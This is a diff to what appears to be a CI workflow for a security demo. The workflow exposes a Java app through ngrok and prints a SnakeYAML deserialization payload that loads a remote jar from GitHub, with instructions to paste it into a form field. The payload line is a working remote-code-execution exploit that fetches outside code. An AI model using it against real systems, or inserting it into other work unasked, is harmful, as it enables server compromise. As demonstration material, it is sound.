@@ -23,9 +23,9 @@ jobs:
         wget -q https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
         tar xvzf ngrok-v3-stable-linux-amd64.tgz
         ./ngrok config add-authtoken ${{ secrets.NGROK_TOKEN }}
-        ./ngrok http --url=overcovetous-cementless-annette.ngrok-free.dev 8080 &
+        ./ngrok http --url=${{ secrets.NGROK_DOMAIN }} 8080 &
         sleep 3
-        echo "App:     https://overcovetous-cementless-annette.ngrok-free.dev"
-        echo "Payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://raw.githubusercontent.com/seal-sec-demo-2/yaml-payload/main/yaml-payload.jar\"]]]]" 
-        echo "Paste the payload into the name field and click Go"
+        echo "App:     https://${{ secrets.NGROK_DOMAIN }}"
+        echo "Payload: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"https://raw.githubusercontent.com/seal-sean-org/yaml-payload/main/yaml-payload.jar\"]]]]"
+        echo "Paste the payload into the newsletter name field and click Unlock"
         java -jar target/maven-demo-1.0.0.jar
